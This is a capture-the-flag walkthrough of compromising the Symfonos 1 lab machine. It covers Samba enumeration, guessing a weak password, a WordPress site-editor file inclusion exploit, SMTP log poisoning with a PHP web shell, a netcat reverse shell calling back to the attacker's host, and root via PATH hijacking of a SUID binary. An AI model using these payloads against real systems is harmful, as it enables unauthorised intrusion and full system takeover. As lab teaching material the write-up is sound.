## Information Gathering
### Host Discovery
We start to discover the target machine with nmap as shown below:

```bash
root@kali:~$ nmap -sn -n 192.168.179.1-254
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 16:59 -05
Nmap scan report for 192.168.179.1
Host is up.
Nmap scan report for 192.168.179.135
Host is up (0.00066s latency).
MAC Address: 00:0C:29:FC:7D:4F (VMware)
Nmap scan report for 192.168.179.254
Host is up (0.00020s latency).
MAC Address: 00:50:56:FC:8B:E8 (VMware)
Nmap done: 254 IP addresses (3 hosts up) scanned in 4.90 seconds
```

### Port Scanning
Identified our target it's time to perform a TCP and UDP scan with unicornscan.

```bash
root@kali:~$ us -Iv -mT -p1-65535 192.168.179.135 && us -Iv -mU -p1-65535 192.168.179.135
...
TCP open                     ssh[   22]         from 192.168.179.135  ttl 64 
TCP open                    smtp[   25]         from 192.168.179.135  ttl 64 
TCP open                    http[   80]         from 192.168.179.135  ttl 64 
TCP open             netbios-ssn[  139]         from 192.168.179.135  ttl 64 
TCP open            microsoft-ds[  445]         from 192.168.179.135  ttl 64 
...
```
Of the scan performed the identified UDP ports were false positives, so I focus to perform the service enumeration of the TCP ports.

### Service Enumeration
With nmap I perform the banner grabbing of the services running on the open TCP ports.

```bash
root@kali:~$ nmap -n -n -sC -sV -v -p22,25,80,139,445 192.168.179.135 -oN nmap-service-enum.txt
...

```

### Samba Enumeration

Then I focus on enumerate the samba service, with the purpose of listing the shared folders, how we can see the **anonymous** folder has read only permissions.

```bash
root@kali:~$ smbmap -H 192.168.179.135 
[+] Guest session       IP: 192.168.179.135:445 Name: 192.168.179.135 
    Disk                           Permissions     Comment
    ----                           -----------     -------
    print$                         NO ACCESS       Printer Drivers
    helios                         NO ACCESS       Helios personal share
    anonymous                      READ ONLY
    IPC$                           NO ACCESS       IPC Service (Samba 4.5.16-Debian)
```

Later I enumerate for samba users and domains with rpcclient as shown below:

```bash
root@kali:~$ rpcclient -U "" -N 192.168.179.135
rpcclient $> enumdomusers
user:[helios] rid:[0x3e8]
rpcclient $> enumdomains
name:[SYMFONOS] idx:[0x0]
name:[Builtin] idx:[0x1]
```
In the result obtained we can only see the **helios** user, but we cannot acces his shared folder because we don't know the password, so we try to log in with a null session to the anonymous folder.

```bash
root@kali:~$ smbclient //192.168.179.135/anonymous -U "" -N
smb: \> ls
  .                                   D        0  Fri Jun 28 20:14:49 2019
  ..                                  D        0  Fri Jun 28 20:12:15 2019

smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (16.7 KiloBytes/sec) (average 16.7 KiloBytes/sec)
smb: \> exit

root@kali:~$ cat attention.txt 

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

We find the **attention.txt** file, download it and see the content specifying that users stop using weak passwords, possibly a of these belongs to helios user.

Then we try with the following credentials **helios:qwerty** and we have access.

```bash
root@kali:~$ smbclient //192.168.179.135/helios -U "helios"    
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls

root@kali:~$ cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
root@kali:~$ cat todo.txt 

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```
We found two files we download it and we see at the bottom of the **todo.txt** file the word **h3l105**, this is possibly a directory name.

### Web Enumeration
We check with the browser the h3l105 directory, but the web page doesn't resolv, to work around this problem assign the following instruction to the hosts file, as shown below:

```bash
root@kali:~$ echo "192.168.179.135 symfonos.local" >> /etc/hosts
```

Solved the problem, we see that it's a wordpress CMS.

```bash
http://symfonos.local/h3l105/
```
![](/assets/images/symfonos1/screenshot-1.png)

Then I fire wpscan to find potetial vulnerabilities in wordpress CMS, and I find the **site-editor version 1.1.1**, which is vulnerable to Local File Inclusion.

```bash
root@kali:~$ wpscan --url http://symfonos.local/h3l105/ 
...
[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
 ...
```
I found the exploit in [exploitdb](https://www.exploit-db.com/exploits/44340), downloaded it and analyzed the proof of concept.

```bash
root@kali:~$ wget https://www.exploit-db.com/download/44340
root@kali:~$ cat 44340
...
 ** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
...
```

## Exploitation
### Local File Inclusion

Later I check the proof of concept requesting the system **passwd** file and we obtain its content.

```bash
http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
![](/assets/images/symfonos1/screenshot-2.png)

If we remember the SMTP service is running, so I verify if it's possible to inject the logs file, and how we can see the helios log file is getting, note the helios mail address, note we found the helios mail address. 

```bash
http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios
```
![](/assets/images/symfonos1/screenshot-3.png)

### SMTP Log Poisoning
With the helios mail address, we will try to send you an email with an injected web shell, as shown below:

```bash
root@kali:~$ nc 192.168.179.135 25 
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
VRFY helios@symfonos.localdomain 
252 2.0.0 helios@symfonos.localdomain
MAIL FROM:s4rgaz@mail.com
250 2.1.0 Ok
RCPT TO:helios@symfonos.localdomain 
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php passthru($_REQUEST['cmd']); ?>
.
250 2.0.0 Ok: queued as C062B40833
quit
221 2.0.0 Bye
```
Then we try to execute the uname command by sending it as a parameter and we get the result.

```bash
root@kali:~$ curl -s http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios\&cmd=uname%20-a
...

Linux symfonos 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux

{"success":true,"data":{"output":[]}}
```

**Getting a reverse shell**

Set up a netcat listener on port 443 and run the netcat reverse shell, and finally we have a low privileges shell.

```bash
root@kali:~$ curl -s http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios\&cmd=nc%20192.168.179.1%20443%20-e%20/bin/bash
```

```bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...

```

## Privilege Escalation
### Path Hijacking
Enumerting for SUID permissions I found the **statuscheck** binary, witch catches my attention.

```bash
helios@symfonos:/var/www/html/h3l105$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```
I execute the binary and I see that it's getting the request headers. 

```bash
helios@symfonos:/var/www/html/h3l105$ /opt/statuscheck
HTTP/1.1 200 OK  
Date: Sat, 29 May 2021 18:57:19 GMT 
Server: Apache/2.4.25 (Debian) 
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT 
ETag: "148-58c6b9bb3bc5b" 
Accept-Ranges: bytes  
Content-Length: 328        
Vary: Accept-Encoding       
Content-Type: text/html
```
Analysing the binary with the strings command, I can see that it's executing the curl utility, so I will try to hijack the path.

```bash
helios@symfonos:/var/www/html/h3l105$ strings /opt/statuscheck
...
_ITM_registerTMCloneTable 
GLIBC_2.2.5  
curl -I H 
http://lH 
ocalhostH
...
```
I export my current directory to the **PATH** environment variable, then I redirect with echo the **/bin/dash** command to the curl file, assign execution permissions to it, and finally run the statuscheck binary thus obtaining root access to this machine.

```bash
helios@symfonos:/dev/shm$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
helios@symfonos:/dev/shm$ export PATH=/dev/shm:$PATH
export PATH=/dev/shm:$PATH
helios@symfonos:/dev/shm$ echo $PATH
echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

helios@symfonos:/dev/shm$ echo '/bin/dash' > curl 
helios@symfonos:/dev/shm$ chmod +x curl 
helios@symfonos:/dev/shm$ /opt/statuscheck 
# id

# whoami

```
